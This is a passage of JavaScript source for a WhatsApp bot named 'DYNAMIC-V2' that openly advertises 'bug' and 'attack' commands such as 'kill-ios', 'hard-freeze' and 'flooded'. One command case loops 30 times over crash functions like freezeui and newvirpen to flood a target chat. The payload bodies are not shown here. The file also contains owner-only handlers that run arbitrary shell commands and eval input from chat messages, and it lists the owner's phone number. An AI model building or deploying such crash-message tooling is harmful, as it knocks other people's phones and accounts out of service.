᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'dban': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kimg=`
     \`𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2\`    
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑯𝒆𝒍𝒍𝒐   ${m.pushName} 𝑫𝒚𝒏𝒂𝒎𝒊𝒄 𝑼𝒔𝒆𝒓
> 𝑷𝒓𝒆𝒇𝒊𝒙 ${prefix}
> 𝑩𝒐𝒕 𝑺𝒑𝒆𝒆𝒅 ${latensi.toFixed(4)}
> 𝑼𝒑𝒕𝒊𝒎𝒆 ${run}
> 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 6.7.7
> 𝑵𝑰𝑪𝑲𝑵𝑨𝑴𝑬 : 𝑫𝒚𝒏𝒂
> 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑽𝑰𝑷 🪀
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒖𝒎 : +254742491666
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒂𝒎𝒆 : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
     \`𝗕𝗔𝗡 𝗠𝗘𝗡𝗨\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~ban1~*
> *~ban2~*
> *~ban3~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑇𝒉𝑎𝑛𝑘𝑠 𝐹𝑜𝑟 𝑈𝑠𝑖𝑛𝑔 𝐷𝑦𝑛𝑎𝑚𝑖𝑐 𝐵𝑜𝑡
  © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
 sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: music,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

case 'dbugs':{
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kimg=`
     \`𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2\`    
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑯𝒆𝒍𝒍𝒐   ${m.pushName} 𝑫𝒚𝒏𝒂𝒎𝒊𝒄 𝑼𝒔𝒆𝒓
> 𝑷𝒓𝒆𝒇𝒊𝒙 ${prefix}
> 𝑩𝒐𝒕 𝑺𝒑𝒆𝒆𝒅 ${latensi.toFixed(4)}
> 𝑼𝒑𝒕𝒊𝒎𝒆 ${run}
> 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 6.7.7
> 𝑵𝑰𝑪𝑲𝑵𝑨𝑴𝑬 : 𝑫𝒚𝒏𝒂
> 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑽𝑰𝑷 🪀
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒖𝒎 : +254742491666
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒂𝒎𝒆 : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
    \`𝗔𝗧𝗧𝗔𝗖𝗞 + (𝗡𝗨𝗠)\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~sam-hard~*
> *~ui-flow~*
> *~ui-hard~*
> *~vigorous~*
> *~ios-lv~* ( iphone )
> *~kill-ios~* ( iphone )
> *~hard-freeze~*
> *~home-cult~*
> *~lava~*
> *~flooded~*
> *~infinite~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
   \`𝗔𝗧𝗧𝗔𝗖𝗞 𝘿𝙄𝙍𝙀𝘾𝙏 𝘿𝙈\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~v1~*
> *~tackle~*
> *~p1~*
> *~screwed~* (ios)
> *~alert~* (ios)
> *~penetrate~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑇𝒉𝑎𝑛𝑘𝑠 𝐹𝑜𝑟 𝑈𝑠𝑖𝑛𝑔 𝐷𝑦𝑛𝑎𝑚𝑖𝑐 𝐵𝑜𝑡
  © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: music,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

case "menu": {
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./Media/dynamic.jpg")}, { upload: sam.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2\n\n> © 2024 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2 🏴‍☠️ ", "sections": [{ "title": " 𝗕𝘆 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ", "highlight_label": \"𝕶𝖎𝖓𝖌 𝕾𝖆𝖒Ѻ\", "rows": [{ "header": "𝐈𝐧𝐟𝐨", "title": "‌", "id": ".info" },
{ "header": "※", "title": "𝐃𝐲𝐧𝐚𝐁𝐮𝐠𝐬 ", "id": ".dbugs" },
{ "header": "※", "title": "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮 ", "id": ".downer" },
{ "header": "᯾", "title": "𝐁𝐚𝐧𝐌𝐞𝐧𝐮 ", "id": ".dban" }, 
{ "header": "᯾", "title": "𝐄𝐱𝐭𝐫𝐚𝐌𝐞𝐧𝐮 ", "id": ".dextra" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥\",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: extd })
await sam.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break
    case 'v1': case 'p1': case 'penetrate': case 'tackle':{
if (!isOwner) return
for (let j = 0; j < 30; j++) {
await nulltag(m.chat, sam, ptcp = true)
await freezekamoflase(m.chat, sam, ptcp = true)
await freezeui(m.chat, sam, ptcp = true)
await freezeuii(m.chat, sam, ptcp = true)
await newvirpen(m.chat, sam, ptcp =true)
}
}
break
//==========================================//
   
  


default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return sam.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return sam.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
sam.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
sam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return sam.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return sam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
sam.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})